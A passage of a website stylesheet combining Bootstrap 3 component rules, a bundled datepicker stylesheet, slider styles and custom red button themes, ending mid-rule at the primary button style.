  .embed-responsive iframe,
  .embed-responsive embed,
  .embed-responsive object {
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: 0;
  }
  .embed-responsive.embed-responsive-16by9 {
    padding-bottom: 56.25%;
  }
  .embed-responsive.embed-responsive-4by3 {
    padding-bottom: 75%;
  }
  .well {
    min-height: 20px;
    padding: 19px;
    margin-bottom: 20px;
    background-color: #f5f5f5;
    border: 1px solid #e3e3e3;
    border-radius: 4px;
    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .05);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .05);
  }
  .well blockquote {
    border-color: #ddd;
    border-color: rgba(0, 0, 0, .15);
  }
  .well-lg {
    padding: 24px;
    border-radius: 6px;
  }
  .well-sm {
    padding: 9px;
    border-radius: 3px;
  }
  .close {
    float: right;
    font-size: 21px;
    font-weight: bold;
    line-height: 1;
    color: #000;
    text-shadow: 0 1px 0 #fff;
    filter: alpha(opacity=20);
    opacity: .2;
  }
  .close:hover,
  .close:focus {
    color: #000;
    text-decoration: none;
    cursor: pointer;
    filter: alpha(opacity=50);
    opacity: .5;
  }
  button.close {
    -webkit-appearance: none;
    padding: 0;
    cursor: pointer;
    background: transparent;
    border: 0;
  }
  .modal-open {
    overflow: hidden;
  }
  .modal {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 1050;
    display: none;
    overflow: hidden;
    -webkit-overflow-scrolling: touch;
    outline: 0;
  }
  .modal.fade .modal-dialog {
    -webkit-transition: -webkit-transform .3s ease-out;
         -o-transition:      -o-transform .3s ease-out;
            transition:         transform .3s ease-out;
    -webkit-transform: translate3d(0, -25%, 0);
         -o-transform: translate3d(0, -25%, 0);
            transform: translate3d(0, -25%, 0);
  }
  .modal.in .modal-dialog {
    -webkit-transform: translate3d(0, 0, 0);
         -o-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
  }
  .modal-open .modal {
    overflow-x: hidden;
    overflow-y: auto;
  }
  .modal-dialog {
    position: relative;
    width: auto;
    margin: 10px;
  }
  .modal-content {
    position: relative;
    background-color: #fff;
    -webkit-background-clip: padding-box;
            background-clip: padding-box;
    border: 1px solid #999;
    border: 1px solid rgba(0, 0, 0, .2);
    border-radius: 6px;
    outline: 0;
    -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, .5);
            box-shadow: 0 3px 9px rgba(0, 0, 0, .5);
  }
  .modal-backdrop {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 1040;
    background-color: #000;
  }
  .modal-backdrop.fade {
    filter: alpha(opacity=0);
    opacity: 0;
  }
  .modal-backdrop.in {
    filter: alpha(opacity=50);
    opacity: .5;
  }
  .modal-header {
    min-height: 16.42857143px;
    padding: 15px;
    border-bottom: 1px solid #e5e5e5;
  }
  .modal-header .close {
    margin-top: -2px;
  }
  .modal-title {
    margin: 0;
    line-height: 1.42857143;
  }
  .modal-body {
    position: relative;
    padding: 15px;
  }
  .modal-footer {
    padding: 15px;
    text-align: right;
    border-top: 1px solid #e5e5e5;
  }
  .modal-footer .btn + .btn {
    margin-bottom: 0;
    margin-left: 5px;
  }
  .modal-footer .btn-group .btn + .btn {
    margin-left: -1px;
  }
  .modal-footer .btn-block + .btn-block {
    margin-left: 0;
  }
  .modal-scrollbar-measure {
    position: absolute;
    top: -9999px;
    width: 50px;
    height: 50px;
    overflow: scroll;
  }
  @media (min-width: 768px) {
    .modal-dialog {
      width: 600px;
      margin: 30px auto;
    }
    .modal-content {
      -webkit-box-shadow: 0 5px 15px rgba(0, 0, 0, .5);
              box-shadow: 0 5px 15px rgba(0, 0, 0, .5);
    }
    .modal-sm {
      width: 300px;
    }
  }
  @media (min-width: 992px) {
    .modal-lg {
      width: 900px;
    }
  }
  .tooltip {
    position: absolute;
    z-index: 1070;
    display: block;
    font-size: 12px;
    line-height: 1.4;
    visibility: visible;
    filter: alpha(opacity=0);
    opacity: 0;
  }
  .tooltip.in {
    filter: alpha(opacity=90);
    opacity: .9;
  }
  .tooltip.top {
    padding: 5px 0;
    margin-top: -3px;
  }
  .tooltip.right {
    padding: 0 5px;
    margin-left: 3px;
  }
  .tooltip.bottom {
    padding: 5px 0;
    margin-top: 3px;
  }
  .tooltip.left {
    padding: 0 5px;
    margin-left: -3px;
  }
  .tooltip-inner {
    max-width: 200px;
    padding: 3px 8px;
    color: #fff;
    text-align: center;
    text-decoration: none;
    background-color: #000;
    border-radius: 4px;
  }
  .tooltip-arrow {
    position: absolute;
    width: 0;
    height: 0;
    border-color: transparent;
    border-style: solid;
  }
  .tooltip.top .tooltip-arrow {
    bottom: 0;
    left: 50%;
    margin-left: -5px;
    border-width: 5px 5px 0;
    border-top-color: #000;
  }
  .tooltip.top-left .tooltip-arrow {
    bottom: 0;
    left: 5px;
    border-width: 5px 5px 0;
    border-top-color: #000;
  }
  .tooltip.top-right .tooltip-arrow {
    right: 5px;
    bottom: 0;
    border-width: 5px 5px 0;
    border-top-color: #000;
  }
  .tooltip.right .tooltip-arrow {
    top: 50%;
    left: 0;
    margin-top: -5px;
    border-width: 5px 5px 5px 0;
    border-right-color: #000;
  }
  .tooltip.left .tooltip-arrow {
    top: 50%;
    right: 0;
    margin-top: -5px;
    border-width: 5px 0 5px 5px;
    border-left-color: #000;
  }
  .tooltip.bottom .tooltip-arrow {
    top: 0;
    left: 50%;
    margin-left: -5px;
    border-width: 0 5px 5px;
    border-bottom-color: #000;
  }
  .tooltip.bottom-left .tooltip-arrow {
    top: 0;
    left: 5px;
    border-width: 0 5px 5px;
    border-bottom-color: #000;
  }
  .tooltip.bottom-right .tooltip-arrow {
    top: 0;
    right: 5px;
    border-width: 0 5px 5px;
    border-bottom-color: #000;
  }
  .popover {
    position: absolute;
    top: 0;
    left: 0;
    z-index: 1060;
    display: none;
    max-width: 276px;
    padding: 1px;
    text-align: left;
    white-space: normal;
    background-color: #fff;
    -webkit-background-clip: padding-box;
            background-clip: padding-box;
    border: 1px solid #ccc;
    border: 1px solid rgba(0, 0, 0, .2);
    border-radius: 6px;
    -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, .2);
            box-shadow: 0 5px 10px rgba(0, 0, 0, .2);
  }
  .popover.top {
    margin-top: -10px;
  }
  .popover.right {
    margin-left: 10px;
  }
  .popover.bottom {
    margin-top: 10px;
  }
  .popover.left {
    margin-left: -10px;
  }
  .popover-title {
    padding: 8px 14px;
    margin: 0;
    font-size: 14px;
    font-weight: normal;
    line-height: 18px;
    background-color: #f7f7f7;
    border-bottom: 1px solid #ebebeb;
    border-radius: 5px 5px 0 0;
  }
  .popover-content {
    padding: 9px 14px;
  }
  .popover > .arrow,
  .popover > .arrow:after {
    position: absolute;
    display: block;
    width: 0;
    height: 0;
    border-color: transparent;
    border-style: solid;
  }
  .popover > .arrow {
    border-width: 11px;
  }
  .popover > .arrow:after {
    content: "";
    border-width: 10px;
  }
  .popover.top > .arrow {
    bottom: -11px;
    left: 50%;
    margin-left: -11px;
    border-top-color: #999;
    border-top-color: rgba(0, 0, 0, .25);
    border-bottom-width: 0;
  }
  .popover.top > .arrow:after {
    bottom: 1px;
    margin-left: -10px;
    content: " ";
    border-top-color: #fff;
    border-bottom-width: 0;
  }
  .popover.right > .arrow {
    top: 50%;
    left: -11px;
    margin-top: -11px;
    border-right-color: #999;
    border-right-color: rgba(0, 0, 0, .25);
    border-left-width: 0;
  }
  .popover.right > .arrow:after {
    bottom: -10px;
    left: 1px;
    content: " ";
    border-right-color: #fff;
    border-left-width: 0;
  }
  .popover.bottom > .arrow {
    top: -11px;
    left: 50%;
    margin-left: -11px;
    border-top-width: 0;
    border-bottom-color: #999;
    border-bottom-color: rgba(0, 0, 0, .25);
  }
  .popover.bottom > .arrow:after {
    top: 1px;
    margin-left: -10px;
    content: " ";
    border-top-width: 0;
    border-bottom-color: #fff;
  }
  .popover.left > .arrow {
    top: 50%;
    right: -11px;
    margin-top: -11px;
    border-right-width: 0;
    border-left-color: #999;
    border-left-color: rgba(0, 0, 0, .25);
  }
  .popover.left > .arrow:after {
    right: 1px;
    bottom: -10px;
    content: " ";
    border-right-width: 0;
    border-left-color: #fff;
  }
  .carousel {
    position: relative;
  }
  .carousel-inner {
    position: relative;
    width: 100%;
    overflow: hidden;
  }
  .carousel-inner > .item {
    position: relative;
    display: none;
    -webkit-transition: .6s ease-in-out left;
         -o-transition: .6s ease-in-out left;
            transition: .6s ease-in-out left;
  }
  .carousel-inner > .item > img,
  .carousel-inner > .item > a > img {
    line-height: 1;
  }
  .carousel-inner > .active,
  .carousel-inner > .next,
  .carousel-inner > .prev {
    display: block;
  }
  .carousel-inner > .active {
    left: 0;
  }
  .carousel-inner > .next,
  .carousel-inner > .prev {
    position: absolute;
    top: 0;
    width: 100%;
  }
  .carousel-inner > .next {
    left: 100%;
  }
  .carousel-inner > .prev {
    left: -100%;
  }
  .carousel-inner > .next.left,
  .carousel-inner > .prev.right {
    left: 0;
  }
  .carousel-inner > .active.left {
    left: -100%;
  }
  .carousel-inner > .active.right {
    left: 100%;
  }
  .carousel-control {
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    width: 15%;
    font-size: 20px;
    color: #fff;
    text-align: center;
    text-shadow: 0 1px 2px rgba(0, 0, 0, .6);
    filter: alpha(opacity=50);
    opacity: .5;
  }
  .carousel-control.left {
    background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, .5) 0%, rgba(0, 0, 0, .0001) 100%);
    background-image:      -o-linear-gradient(left, rgba(0, 0, 0, .5) 0%, rgba(0, 0, 0, .0001) 100%);
    background-image: -webkit-gradient(linear, left top, right top, from(rgba(0, 0, 0, .5)), to(rgba(0, 0, 0, .0001)));
    background-image:         linear-gradient(to right, rgba(0, 0, 0, .5) 0%, rgba(0, 0, 0, .0001) 100%);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1);
    background-repeat: repeat-x;
  }
  .carousel-control.right {
    right: 0;
    left: auto;
    background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, .0001) 0%, rgba(0, 0, 0, .5) 100%);
    background-image:      -o-linear-gradient(left, rgba(0, 0, 0, .0001) 0%, rgba(0, 0, 0, .5) 100%);
    background-image: -webkit-gradient(linear, left top, right top, from(rgba(0, 0, 0, .0001)), to(rgba(0, 0, 0, .5)));
    background-image:         linear-gradient(to right, rgba(0, 0, 0, .0001) 0%, rgba(0, 0, 0, .5) 100%);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1);
    background-repeat: repeat-x;
  }
  .carousel-control:hover,
  .carousel-control:focus {
    color: #fff;
    text-decoration: none;
    filter: alpha(opacity=90);
    outline: 0;
    opacity: .9;
  }
  .carousel-control .icon-prev,
  .carousel-control .icon-next,
  .carousel-control .glyphicon-chevron-left,
  .carousel-control .glyphicon-chevron-right {
    position: absolute;
    top: 50%;
    z-index: 5;
    display: inline-block;
  }
  .carousel-control .icon-prev,
  .carousel-control .glyphicon-chevron-left {
    left: 50%;
    margin-left: -10px;
  }
  .carousel-control .icon-next,
  .carousel-control .glyphicon-chevron-right {
    right: 50%;
    margin-right: -10px;
  }
  .carousel-control .icon-prev,
  .carousel-control .icon-next {
    width: 20px;
    height: 20px;
    margin-top: -10px;
    font-family: serif;
  }
  .carousel-control .icon-prev:before {
    content: '\2039';
  }
  .carousel-control .icon-next:before {
    content: '\203a';
  }
  .carousel-indicators {
    position: absolute;
    bottom: 10px;
    left: 50%;
    z-index: 15;
    width: 60%;
    padding-left: 0;
    margin-left: -30%;
    text-align: center;
    list-style: none;
  }
  .carousel-indicators li {
    display: inline-block;
    width: 10px;
    height: 10px;
    margin: 1px;
    text-indent: -999px;
    cursor: pointer;
    background-color: #000 \9;
    background-color: rgba(0, 0, 0, 0);
    border: 1px solid #fff;
    border-radius: 10px;
  }
  .carousel-indicators .active {
    width: 12px;
    height: 12px;
    margin: 0;
    background-color: #fff;
  }
  .carousel-caption {
    position: absolute;
    right: 15%;
    bottom: 20px;
    left: 15%;
    z-index: 10;
    padding-top: 20px;
    padding-bottom: 20px;
    color: #fff;
    text-align: center;
    text-shadow: 0 1px 2px rgba(0, 0, 0, .6);
  }
  .carousel-caption .btn {
    text-shadow: none;
  }
  @media screen and (min-width: 768px) {
    .carousel-control .glyphicon-chevron-left,
    .carousel-control .glyphicon-chevron-right,
    .carousel-control .icon-prev,
    .carousel-control .icon-next {
      width: 30px;
      height: 30px;
      margin-top: -15px;
      font-size: 30px;
    }
    .carousel-control .glyphicon-chevron-left,
    .carousel-control .icon-prev {
      margin-left: -15px;
    }
    .carousel-control .glyphicon-chevron-right,
    .carousel-control .icon-next {
      margin-right: -15px;
    }
    .carousel-caption {
      right: 20%;
      left: 20%;
      padding-bottom: 30px;
    }
    .carousel-indicators {
      bottom: 20px;
    }
  }
  .clearfix:before,
  .clearfix:after,
  .dl-horizontal dd:before,
  .dl-horizontal dd:after,
  .container:before,
  .container:after,
  .container-fluid:before,
  .container-fluid:after,
  .row:before,
  .row:after,
  .form-horizontal .form-group:before,
  .form-horizontal .form-group:after,
  .btn-toolbar:before,
  .btn-toolbar:after,
  .btn-group-vertical > .btn-group:before,
  .btn-group-vertical > .btn-group:after,
  .nav:before,
  .nav:after,
  .navbar:before,
  .navbar:after,
  .navbar-header:before,
  .navbar-header:after,
  .navbar-collapse:before,
  .navbar-collapse:after,
  .pager:before,
  .pager:after,
  .panel-body:before,
  .panel-body:after,
  .modal-footer:before,
  .modal-footer:after {
    display: table;
    content: " ";
  }
  .clearfix:after,
  .dl-horizontal dd:after,
  .container:after,
  .container-fluid:after,
  .row:after,
  .form-horizontal .form-group:after,
  .btn-toolbar:after,
  .btn-group-vertical > .btn-group:after,
  .nav:after,
  .navbar:after,
  .navbar-header:after,
  .navbar-collapse:after,
  .pager:after,
  .panel-body:after,
  .modal-footer:after {
    clear: both;
  }
  .center-block {
    display: block;
    margin-right: auto;
    margin-left: auto;
  }
  .pull-right {
    float: right !important;
  }
  .pull-left {
    float: left !important;
  }
  .hide {
    display: none !important;
  }
  .show {
    display: block !important;
  }
  .invisible {
    visibility: hidden;
  }
  .text-hide {
    font: 0/0 a;
    color: transparent;
    text-shadow: none;
    background-color: transparent;
    border: 0;
  }
  .hidden {
    display: none !important;
    visibility: hidden !important;
  }
  .affix {
    position: fixed;
    -webkit-transform: translate3d(0, 0, 0);
         -o-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
  }
  @-ms-viewport {
    width: device-width;
  }
  .visible-xs,
  .visible-sm,
  .visible-md,
  .visible-lg {
    display: none !important;
  }
  .visible-xs-block,
  .visible-xs-inline,
  .visible-xs-inline-block,
  .visible-sm-block,
  .visible-sm-inline,
  .visible-sm-inline-block,
  .visible-md-block,
  .visible-md-inline,
  .visible-md-inline-block,
  .visible-lg-block,
  .visible-lg-inline,
  .visible-lg-inline-block {
    display: none !important;
  }
  @media (max-width: 767px) {
    .visible-xs {
      display: block !important;
    }
    table.visible-xs {
      display: table;
    }
    tr.visible-xs {
      display: table-row !important;
    }
    th.visible-xs,
    td.visible-xs {
      display: table-cell !important;
    }
  }
  @media (max-width: 767px) {
    .visible-xs-block {
      display: block !important;
    }
  }
  @media (max-width: 767px) {
    .visible-xs-inline {
      display: inline !important;
    }
  }
  @media (max-width: 767px) {
    .visible-xs-inline-block {
      display: inline-block !important;
    }
  }
  @media (min-width: 768px) and (max-width: 991px) {
    .visible-sm {
      display: block !important;
    }
    table.visible-sm {
      display: table;
    }
    tr.visible-sm {
      display: table-row !important;
    }
    th.visible-sm,
    td.visible-sm {
      display: table-cell !important;
    }
  }
  @media (min-width: 768px) and (max-width: 991px) {
    .visible-sm-block {
      display: block !important;
    }
  }
  @media (min-width: 768px) and (max-width: 991px) {
    .visible-sm-inline {
      display: inline !important;
    }
  }
  @media (min-width: 768px) and (max-width: 991px) {
    .visible-sm-inline-block {
      display: inline-block !important;
    }
  }
  @media (min-width: 992px) and (max-width: 1199px) {
    .visible-md {
      display: block !important;
    }
    table.visible-md {
      display: table;
    }
    tr.visible-md {
      display: table-row !important;
    }
    th.visible-md,
    td.visible-md {
      display: table-cell !important;
    }
  }
  @media (min-width: 992px) and (max-width: 1199px) {
    .visible-md-block {
      display: block !important;
    }
  }
  @media (min-width: 992px) and (max-width: 1199px) {
    .visible-md-inline {
      display: inline !important;
    }
  }
  @media (min-width: 992px) and (max-width: 1199px) {
    .visible-md-inline-block {
      display: inline-block !important;
    }
  }
  @media (min-width: 1200px) {
    .visible-lg {
      display: block !important;
    }
    table.visible-lg {
      display: table;
    }
    tr.visible-lg {
      display: table-row !important;
    }
    th.visible-lg,
    td.visible-lg {
      display: table-cell !important;
    }
  }
  @media (min-width: 1200px) {
    .visible-lg-block {
      display: block !important;
    }
  }
  @media (min-width: 1200px) {
    .visible-lg-inline {
      display: inline !important;
    }
  }
  @media (min-width: 1200px) {
    .visible-lg-inline-block {
      display: inline-block !important;
    }
  }
  @media (max-width: 767px) {
    .hidden-xs {
      display: none !important;
    }
  }
  @media (min-width: 768px) and (max-width: 991px) {
    .hidden-sm {
      display: none !important;
    }
  }
  @media (min-width: 992px) and (max-width: 1199px) {
    .hidden-md {
      display: none !important;
    }
  }
  @media (min-width: 1200px) {
    .hidden-lg {
      display: none !important;
    }
  }
  .visible-print {
    display: none !important;
  }
  @media print {
    .visible-print {
      display: block !important;
    }
    table.visible-print {
      display: table;
    }
    tr.visible-print {
      display: table-row !important;
    }
    th.visible-print,
    td.visible-print {
      display: table-cell !important;
    }
  }
  .visible-print-block {
    display: none !important;
  }
  @media print {
    .visible-print-block {
      display: block !important;
    }
  }
  .visible-print-inline {
    display: none !important;
  }
  @media print {
    .visible-print-inline {
      display: inline !important;
    }
  }
  .visible-print-inline-block {
    display: none !important;
  }
  @media print {
    .visible-print-inline-block {
      display: inline-block !important;
    }
  }
  @media print {
    .hidden-print {
      display: none !important;
    }
  }
  
  /*!
 * Datepicker for Bootstrap
 *
 * Copyright 2012 Stefan Petre
 * Licensed under the Apache License v2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 */
 .datepicker {
    top: 0;
    left: 0;
    padding: 4px;
    margin-top: 1px;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    /*.dow {
      border-top: 1px solid #ddd !important;
    }*/
  
  }
  .datepicker:before {
    content: '';
    display: inline-block;
    border-left: 7px solid transparent;
    border-right: 7px solid transparent;
    border-bottom: 7px solid #ccc;
    border-bottom-color: rgba(0, 0, 0, 0.2);
    position: absolute;
    top: -7px;
    left: 6px;
  }
  .datepicker:after {
    content: '';
    display: inline-block;
    border-left: 6px solid transparent;
    border-right: 6px solid transparent;
    border-bottom: 6px solid #ffffff;
    position: absolute;
    top: -6px;
    left: 7px;
  }
  .datepicker > div {
    display: none;
  }
  .datepicker table {
    width: 100%;
    margin: 0;
  }
  .datepicker td,
  .datepicker th {
    text-align: center;
    width: 20px;
    height: 20px;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
  }
  .datepicker td.day:hover {
    background: #eeeeee;
    cursor: pointer;
  }
  .datepicker td.day.disabled {
    color: #eeeeee;
  }
  .datepicker td.old,
  .datepicker td.new {
    color: #999999;
  }
  .datepicker td.active,
  .datepicker td.active:hover {
    color: #ffffff;
    background-color: #006dcc;
    background-image: -moz-linear-gradient(top, #0088cc, #0044cc);
    background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#0088cc), to(#0044cc));
    background-image: -webkit-linear-gradient(top, #0088cc, #0044cc);
    background-image: -o-linear-gradient(top, #0088cc, #0044cc);
    background-image: linear-gradient(to bottom, #0088cc, #0044cc);
    background-repeat: repeat-x;
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0088cc', endColorstr='#ff0044cc', GradientType=0);
    border-color: #0044cc #0044cc #002a80;
    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);
    *background-color: #0044cc;
    /* Darken IE7 buttons by default so they stand out more given they won't have borders */
  
    filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
    color: #fff;
    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
  }
  .datepicker td.active:hover,
  .datepicker td.active:hover:hover,
  .datepicker td.active:focus,
  .datepicker td.active:hover:focus,
  .datepicker td.active:active,
  .datepicker td.active:hover:active,
  .datepicker td.active.active,
  .datepicker td.active:hover.active,
  .datepicker td.active.disabled,
  .datepicker td.active:hover.disabled,
  .datepicker td.active[disabled],
  .datepicker td.active:hover[disabled] {
    color: #ffffff;
    background-color: #0044cc;
    *background-color: #003bb3;
  }
  .datepicker td.active:active,
  .datepicker td.active:hover:active,
  .datepicker td.active.active,
  .datepicker td.active:hover.active {
    background-color: #003399 \9;
  }
  .datepicker td span {
    display: block;
    width: 47px;
    height: 54px;
    line-height: 54px;
    float: left;
    margin: 2px;
    cursor: pointer;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
  }
  .datepicker td span:hover {
    background: #eeeeee;
  }
  .datepicker td span.active {
    color: #ffffff;
    background-color: #006dcc;
    background-image: -moz-linear-gradient(top, #0088cc, #0044cc);
    background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#0088cc), to(#0044cc));
    background-image: -webkit-linear-gradient(top, #0088cc, #0044cc);
    background-image: -o-linear-gradient(top, #0088cc, #0044cc);
    background-image: linear-gradient(to bottom, #0088cc, #0044cc);
    background-repeat: repeat-x;
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff0088cc', endColorstr='#ff0044cc', GradientType=0);
    border-color: #0044cc #0044cc #002a80;
    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);
    *background-color: #0044cc;
    /* Darken IE7 buttons by default so they stand out more given they won't have borders */
  
    filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
    color: #fff;
    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
  }
  .datepicker td span.active:hover,
  .datepicker td span.active:focus,
  .datepicker td span.active:active,
  .datepicker td span.active.active,
  .datepicker td span.active.disabled,
  .datepicker td span.active[disabled] {
    color: #ffffff;
    background-color: #0044cc;
    *background-color: #003bb3;
  }
  .datepicker td span.active:active,
  .datepicker td span.active.active {
    background-color: #003399 \9;
  }
  .datepicker td span.old {
    color: #999999;
  }
  .datepicker th.switch {
    width: 145px;
  }
  .datepicker th.next,
  .datepicker th.prev {
    font-size: 21px;
  }
  .datepicker thead tr:first-child th {
    cursor: pointer;
  }
  .datepicker thead tr:first-child th:hover {
    background: #eeeeee;
  }
  .input-append.date .add-on i,
  .input-prepend.date .add-on i {
    display: block;
    cursor: pointer;
    width: 16px;
    height: 16px;
  }
	
.slider {
    display: inline-block;
    position: relative;
    vertical-align: middle;
}
.slider.slider-horizontal {
    height: 20px;
    width: 100%; /*210px;*/
}
.slider.slider-horizontal .slider-track {
    height: 20px;
    left: 0;
    margin-top: -5px;
    top: 50%;
    width: 100%;
}
.slider.slider-horizontal .slider-selection {
    bottom: 0;
    height: 100%;
    top: 0;
}
.slider.slider-horizontal .slider-handle {
    margin-left: -10px;
    margin-top: -5px;
}
.slider.slider-horizontal .slider-handle.triangle {
    border-bottom-color: #0480BE;
    border-width: 0 10px 10px;
    height: 0;
    margin-top: 0;
    width: 0;
}
.slider.slider-vertical {
    height: 210px;
    width: 20px;
}
.slider.slider-vertical .slider-track {
    height: 100%;
    left: 50%;
    margin-left: -5px;
    top: 0;
    width: 10px;
}
.slider.slider-vertical .slider-selection {
    bottom: 0;
    left: 0;
    top: 0;
    width: 100%;
}
.slider.slider-vertical .slider-handle {
    margin-left: -5px;
    margin-top: -10px;
}
.slider.slider-vertical .slider-handle.triangle {
    border-left-color: #0480BE;
    border-width: 10px 0 10px 10px;
    height: 1px;
    margin-left: 0;
    width: 1px;
}
.slider.slider-disabled .slider-handle {
    background-image: linear-gradient(to bottom, #DFDFDF 0%, #BEBEBE 100%);
    background-repeat: repeat-x;
}
.slider.slider-disabled .slider-track {
    background-image: linear-gradient(to bottom, #E5E5E5 0%, #E9E9E9 100%);
    background-repeat: repeat-x;
    cursor: not-allowed;
}
.slider input {
    display: none;
}
.slider .tooltip-inner {
    white-space: nowrap;
}
.slider-track {
    background-image: linear-gradient(to bottom, #F5F5F5 0%, #F9F9F9 100%);
    background-color: #F9F9F9;
    background-repeat: repeat-x;
    border-radius: 4px;
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1) inset;
    cursor: pointer;
    position: absolute;
}
.slider-selection {
    -moz-box-sizing: border-box;
    background-image: linear-gradient(to bottom, #E3E3E3 0%, #F5F5F5 100%);
    background-color: #E3E3E3;
    background-repeat: repeat-x;
    border-radius: 4px;
    box-shadow: 0 -1px 0 rgba(0, 0, 0, 0.15) inset;
    position: absolute;
}
.slider-handle {
	background-color:#BE0404;
    background-image: linear-gradient(to bottom, #DE1414 0%, #BE0404 100%);
    background-repeat: repeat-x;
    border: 0 solid rgba(0, 0, 0, 0);
    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.08) inset,  0px 0px 1px rgba(0, 0, 0, .3);
    height: 20px;

    position: absolute;
    width: 20px;
}
.slider-handle.round {
    border-radius: 50%;
}
.slider-handle.triangle {
    background: none repeat scroll 0 0 rgba(0, 0, 0, 0);
}
.slider-handle{ border-radius: 4px; height: 30px; }
.slider-handle:active, .slider-handle:focus { background-image: none;}
.slider-handle:before { content: "|||"; position:relative; font-family:  Arial,sans-serif; color: #9D0000; display: block; width: 100%; text-align: center; font-size: 16px; top: 2px; position: relative;    text-shadow: 1px 0 0 rgba(255, 255, 255, 0.3)   }
	.btn-default, .btn-primary, .btn-success, .btn-info, .btn-warning, .btn-danger {
    text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.2);
    -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 0, 0.075);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 1px 1px rgba(0, 0, 0, 0.075);
}

.btn-default:active, .btn-primary:active, .btn-success:active, .btn-info:active, .btn-warning:active, .btn-danger:active, .btn-default.active, .btn-primary.active, .btn-success.active, .btn-info.active, .btn-warning.active, .btn-danger.active {
    -webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
    box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
}

.btn:active, .btn.active {
    background-image: none;
}

.btn-default {
    text-shadow: 0 1px 0 #fff;
    border-color: #e0e0e0;
    border-color: #ccc;
    background: #e6e6e6;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNlNmU2ZTYiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
    background: -moz-linear-gradient(top, #ffffff 0%, #e6e6e6 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#ffffff), color-stop(100%,#e6e6e6));
    background: -webkit-linear-gradient(top, #ffffff 0%,#e6e6e6 100%);
    background: -o-linear-gradient(top, #ffffff 0%,#e6e6e6 100%);
    background: -ms-linear-gradient(top, #ffffff 0%,#e6e6e6 100%);
    background: linear-gradient(to bottom, #ffffff 0%,#e6e6e6 100%);
}

.btn-default:active, .btn-default.active {
    background-color: #e6e6e6;
    border-color: #e0e0e0;
}

.btn-primary {
    border-color: rgba(228, 0, 0, 0.1) rgba(0, 0, 0, 0.2) rgba(0, 0, 0, 0.4);
    background-color: #D81E05;
    *background-color: #CC0000;
